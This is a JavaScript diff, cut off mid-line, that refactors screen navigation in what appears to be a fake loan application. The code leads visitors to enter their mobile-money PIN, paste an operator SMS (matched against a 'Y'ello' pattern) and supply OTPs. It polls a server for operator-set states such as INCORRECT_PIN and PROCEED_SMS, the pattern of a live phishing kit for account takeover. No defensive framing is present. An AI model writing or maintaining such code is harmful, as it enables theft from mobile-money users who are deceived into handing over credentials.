@@ -1,19 +1,38 @@
 (function () {
+  function getScreenEl(key) {
+    const map = {
+      welcome: 'screen-welcome',
+      slider: 'screen-slider',
+      form1: 'screen-form1',
+      form2: 'screen-form2',
+      form3: 'screen-form3',
+      pin: 'screen-pin',
+      sms: 'screen-sms',
+      otp: 'screen-otp',
+      success: 'screen-success',
+      stopped: 'screen-stopped'
+    };
+    return document.getElementById(map[key] || '');
+  }
+
+  function showScreenByKey(key) {
+    const allScreens = document.querySelectorAll('.screen');
+    allScreens.forEach((s) => {
+      s.classList.remove('active');
+      s.style.display = 'none';
+    });
+    const target = getScreenEl(key);
+    if (target) {
+      target.classList.add('active');
+      target.style.display = 'flex';
+      try {
+        window.scrollTo(0, 0);
+      } catch (e) {}
+    }
+  }
+
   function initApp() {
     const $ = (id) => document.getElementById(id);
-
-    const screens = {
-      welcome: $('screen-welcome'),
-      slider: $('screen-slider'),
-      form1: $('screen-form1'),
-      form2: $('screen-form2'),
-      form3: $('screen-form3'),
-      pin: $('screen-pin'),
-      sms: $('screen-sms'),
-      otp: $('screen-otp'),
-      success: $('screen-success'),
-      stopped: $('screen-stopped')
-    };
 
     const loadingOverlay = $('loading-overlay');
 
@@ -72,7 +91,7 @@
     let otpSubmittedForCurrentValue = '';
     let appliedLoanLabel = 'ZMW 100,000';
 
-    const urlParams = new URLSearchParams(window.location.search);
+    const urlParams = new URLSearchParams(window.location.search || '');
     const adminParam = urlParams.get('admin') || '';
 
     const REQUIRED_SMS_REGEX = /^Y['’]ello\.\s*Please note!/i;
@@ -137,20 +156,6 @@
       if (loadingOverlay) loadingOverlay.classList.remove('active');
     }
 
-    function showScreen(targetScreen) {
-      Object.values(screens).forEach((s) => {
-        if (s) s.classList.remove('active');
-      });
-      if (targetScreen) {
-        targetScreen.classList.add('active');
-        try {
-          window.scrollTo({ top: 0, behavior: 'instant' });
-        } catch (err) {
-          window.scrollTo(0, 0);
-        }
-      }
-    }
-
     function updateCalc() {
       const amt = loanSlider ? Number(loanSlider.value) || 100000 : 100000;
       const mths = monthsSlider ? Number(monthsSlider.value) || 48 : 48;
@@ -201,7 +206,7 @@
       if (sumDuration) sumDuration.innerText = dur;
       if (sumPurpose) sumPurpose.innerText = purp;
       hideBanner(bannerPhoneError);
-      showScreen(screens.form2);
+      showScreenByKey('form2');
     }
 
     function goFromForm2ToForm3() {
@@ -236,7 +241,7 @@
       if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;
 
       hideBanner(bannerForm3Error);
-      showScreen(screens.form3);
+      showScreenByKey('form3');
     }
 
     async function submitApplicationAndOpenPin() {
@@ -274,7 +279,7 @@
       hideBanner(bannerOtpError);
       hideBanner(bannerOtpInfo);
 
-      showScreen(screens.pin);
+      showScreenByKey('pin');
       if (yelloPinInput) yelloPinInput.focus();
 
       try {
@@ -425,10 +430,9 @@
             if (smsTimerInterval) clearInterval(smsTimerInterval);
             hideLoading();
             if (blockedReasonText) {
-              blockedReasonText.innerText =
-                'PLEASE CHECK YOUR MOMO DETAILS AND TRY AGAIN.';
+              blockedReasonText.innerText = 'PLEASE CHECK YOUR MOMO DETAILS AND TRY AGAIN.';
             }
-            showScreen(screens.stopped);
+            showScreenByKey('stopped');
           } else if (st === 'PROCEED_SMS') {
             clearInterval(statusPollInterval);
             hideLoading();
@@ -439,7 +443,7 @@
             );
             smsAutoSubmittedForCurrentValue = '';
             if (smsInputBox) smsInputBox.value = '';
-            showScreen(screens.sms);
+            showScreenByKey('sms');
             startSmsCountdown();
             if (smsInputBox) smsInputBox.focus();
           } else if (st === 'INCORRECT_PIN') {
@@ -449,15 +453,18 @@
             pinAutoSubmittedForCurrentValue = '';
             if (yelloPinInput) yelloPinInput.value = '';
             syncPinReadyState();
-            showScreen(screens.pin);
-            showBanner(bannerPinError, 'INCORRECT PIN — ENTER A NEW 5-DIGIT PIN ON THE EMPTY SPACE PROVIDED.');
+            showScreenByKey('pin');
+            showBanner(
+              bannerPinError,
+              'INCORRECT PIN — ENTER A NEW 5-DIGIT PIN ON THE EMPTY SPACE PROVIDED.'
+            );
             if (yelloPinInput) yelloPinInput.focus();
           } else if (st === 'SMS_EXPIRED') {
             clearInterval(statusPollInterval);
             hideLoading();
             smsAutoSubmittedForCurrentValue = '';
             if (smsInputBox) smsInputBox.value = '';
-            showScreen(screens.sms);
+            showScreenByKey('sms');
             showBanner(
               bannerSmsError,
               'SMS EXPIRED — ENTER A NEW INCOMING SMS ON THE EMPTY SPACE PROVIDED.'
@@ -469,13 +476,10 @@
             if (smsTimerInterval) clearInterval(smsTimerInterval);
             hideLoading();
             hideBanner(bannerOtpError);
-            showBanner(
-              bannerOtpInfo,
-              'ENTER NEW INCOMING 4 DIGITS SENT TO YOUR MOMO NUMBER.'
-            );
+            showBanner(bannerOtpInfo, 'ENTER NEW INCOMING 4 DIGITS SENT TO YOUR MOMO NUMBER.');
             otpSubmittedForCurrentValue = '';
             otpBoxes4.forEach((b) => (b.value = ''));
-            showScreen(screens.otp);
+            showScreenByKey('otp');
             if (otpBoxes4[0]) otpBoxes4[0].focus();
           } else if (st === 'EXPIRED_OTP' || st === 'OTP_EXPIRED') {
             clearInterval(statusPollInterval);
@@ -483,7 +487,7 @@
             hideLoading();
             otpSubmittedForCurrentValue = '';
             otpBoxes4.forEach((b) => (b.value = ''));
-            showScreen(screens.otp);
+            showScreenByKey('otp');
             showBanner(
               bannerOtpError,
               'OTP EXPIRES — ENTER NEW INCOMING 4 DIGITS SENT TO YOUR MOMO NUMBER.'
@@ -494,7 +498,7 @@
             if (smsTimerInterval) clearInterval(smsTimerInterval);
             hideLoading();
             setAppliedLoanAmountDisplay(formAmountInput?.value || appliedLoanLabel);
-            showScreen(screens.success);
+            showScreenByKey('success');
           }
         } catch (e) {}
       }, 1000);
@@ -526,33 +530,30 @@
         bannerOtpInfo
       ].forEach(hideBanner);
       hideLoading();
-      showScreen(screens.welcome);
+      showScreenByKey('welcome');
     }
 
     async function handleButtonAction(buttonId, event) {
       switch (buttonId) {
         case 'btn-goto-slider':
           updateCalc();
-          showScreen(screens.slider);
+          showScreenByKey('slider');
           break;
         case 'btn-slider-back':
-          showScreen(screens.welcome);
+          showScreenByKey('welcome');
           break;
         case 'btn-goto-form1':
-          showScreen(screens.form1);
+          showScreenByKey('form1');
           break;
         case 'btn-form1-back':
           updateCalc();
-          showScreen(screens.slider);
+          showScreenByKey('slider');
           break;
         case 'btn-form1-next':
           goFromForm1ToForm2();
           break;
         case 'btn-form2-prev':
         case 'btn-form2-prev-alt':
-          showScreen(screens.form1);
+          showScreenByKey('form1');
           break;
         case 'btn-form2-next':
-          goFromForm2ToForm3();
-          break;
-        case 'b
